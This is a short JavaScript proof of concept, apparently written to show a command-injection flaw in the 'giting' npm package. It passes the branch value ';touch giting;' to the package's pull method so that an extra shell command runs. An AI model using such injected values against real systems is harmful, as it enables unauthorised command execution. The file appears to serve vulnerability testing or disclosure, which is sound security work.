const Test = require("giting");

let injection_command = ";touch giting;";
const test = new Test({ workDir: "./" });
const repo = {
  organization: "./",
  name: "./",
  branch: injection_command,
};
try {
  test.pull(repo, function () {});
} catch (err) {}
